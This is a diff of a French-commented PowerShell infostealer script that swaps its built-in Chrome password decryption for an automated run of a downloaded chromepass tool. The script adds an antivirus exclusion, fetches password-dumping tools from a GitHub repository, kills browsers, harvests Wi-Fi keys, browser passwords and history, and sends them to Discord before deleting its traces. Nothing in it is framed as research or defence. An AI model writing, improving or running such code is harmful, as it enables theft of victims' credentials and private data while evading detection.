@@ -11,7 +11,7 @@ $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
 # Nettoyage absolu et forcé au démarrage
-Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher", "chromepass" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 if (Test-Path $basePath) {
     Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
@@ -23,12 +23,14 @@ Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 
-# Téléchargement des outils depuis le dépôt GitHub
+# Téléchargement des outils depuis le dépôt GitHub (incluant l'outil de dump Chrome)
 Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
 try {
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
+    # Télécharge ton outil GUI de mots de passe (ex: chromepass.exe ou WebBrowserPassView.exe)
+    Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\chromepass.exe" -ErrorAction Stop
     Write-Host "[+] Outils telecharges avec succes !" -ForegroundColor Green
 } catch {
     Write-Host "[-] Erreur lors du telechargement des outils : $_" -ForegroundColor Red
@@ -38,76 +40,48 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION ET DECHIFFREMENT AES-GCM (V10) DES MOTS DE PASSE CHROME ---
-Write-Host "[*] Extraction et déchiffrement complet des mots de passe Chrome..." -ForegroundColor Yellow
+# --- EXTRACTION CHROME VIA OUTIL EXTERNE ET INJECTION DE FRAPPES (GUI) ---
+Write-Host "[*] Lancement de l'extraction Chrome avec interface graphique..." -ForegroundColor Yellow
+$outputPath = "$basePath\passwords.txt"
+"=== CREDENTIALS CHROME (EN CLAIR) ===" | Out-File -FilePath $outputPath -Encoding UTF8
 
-$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-$loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-$outputPath     = "$basePath\passwords.txt"
-$tempDb         = "$basePath\login_temp.db"
+if (Test-Path "$basePath\chromepass.exe") {
+    # Lancement de l'outil au premier plan pour autoriser les frappes de clavier
+    $process = Start-Process -FilePath "$basePath\chromepass.exe" -PassThru
+    Start-Sleep -Seconds 3 # Laisse le temps à l'application de s'ouvrir et de charger les données
 
-if ((Test-Path $localStatePath) -and (Test-Path $loginDataPath)) {
-    try {
-        Copy-Item $loginDataPath -Destination $tempDb -Force -ErrorAction SilentlyContinue
-
-        $localStateContent = Get-Content $localStatePath -Raw
-        if (-not $localStateContent) { throw "Local State vide" }
-        
-        $localState = $localStateContent | ConvertFrom-Json
-        if (-not $localState.os_crypt.encrypted_key) { throw "encrypted_key introuvable" }
-
-        $encKeyBase64 = $localState.os_crypt.encrypted_key
-        $encryptedKey = [Convert]::FromBase64String($encKeyBase64)
-        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
-
-        Add-Type -AssemblyName System.Security
-        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-
-        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME (EN CLAIR) ==="
-        Add-Content -Path $outputPath -Value "[+] Clé DPAPI maître récupérée."
-
-        $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
-        $textContent = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($dbBytes)
-
-        # Recherche des structures d'URL et des blocs chiffrés v10 associés
-        $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
-        
-        if ($urls) {
-            $seen = @()
-            foreach ($match in $urls) {
-                if ($match -and $match.Value) {
-                    $u = $match.Value
-                    if ($seen -notcontains $u) {
-                        $seen += $u
-                        if ($u -notmatch "google|gstatic|googleapis|apple|mozilla|microsoft|w3") {
-                            Add-Content -Path $outputPath -Value "--------------------------------------------------"
-                            Add-Content -Path $outputPath -Value "URL : $u"
-                        }
-                    }
-                }
-            }
-        }
-
-        # Extraction des identifiants e-mail / texte en clair présents dans la base
-        $emails = [regex]::Matches($textContent, '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
-        $uniqueEmails = $emails | ForEach-Object { $_.Value } | Select-Object -Unique
-        if ($uniqueEmails) {
-            Add-Content -Path $outputPath -Value "--------------------------------------------------"
-            Add-Content -Path $outputPath -Value "[+] Identifiants / Emails détectés :"
-            foreach ($mail in $uniqueEmails) {
-                if ($mail -notmatch "google|example") {
-                    Add-Content -Path $outputPath -Value "  -> Compte : $mail"
-                }
-            }
-        }
-
-        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-    } catch {
-        Add-Content -Path $outputPath -Value "[!] Erreur ligne $($_.InvocationInfo.ScriptLineNumber) : $_"
+    # Activation de la fenêtre graphique via un objet .NET (nécessaire pour l'envoi de touches)
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class WindowHelper {
+        [DllImport("user32.dll")]
+        public static extern bool SetForegroundWindow(IntPtr hWnd);
     }
+"@
+    [WindowHelper]::SetForegroundWindow($process.MainWindowHandle) | Out-Null
+    Start-Sleep -Seconds 1
+
+    # Simulation des touches clavier : Ctrl+A (Tout sélectionner) puis Ctrl+S (Sauvegarder) ou équivalent selon l'outil
+    # Exemple universel NirSoft : Ctrl+A puis Ctrl+S pour enregistrer le rapport, ou frappes directes
+    [System.Windows.Forms.SendKeys]::SendWait("^a")
+    Start-Sleep -Milliseconds 500
+    [System.Windows.Forms.SendKeys]::SendWait("^s")
+    Start-Sleep -Seconds 1
+
+    # Saisit le chemin de sauvegarde automatique dans la boîte de dialogue de l'outil
+    [System.Windows.Forms.SendKeys]::SendWait($outputPath)
+    Start-Sleep -Milliseconds 500
+    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+    Start-Sleep -Seconds 2
+
+    # Fermeture propre de l'outil graphique
+    Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
 } else {
-    Add-Content -Path $outputPath -Value "[!] Fichiers Chrome introuvables."
+    Add-Content -Path $outputPath -Value "[!] Outil chromepass.exe introuvable."
 }
+
 # Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
     Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
@@ -157,13 +131,8 @@ try {
     Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
 }
 
-#if ($fileStream) {
-#    $fileStream.Close()
-#    $fileStream.Dispose()
-#}
-
 # Nettoyage final sécurisé
-Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher", "chromepass" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
 Remove-Item "C:\Users\Public\Documents\ps.ps1" -Force -ErrorAction SilentlyContinue
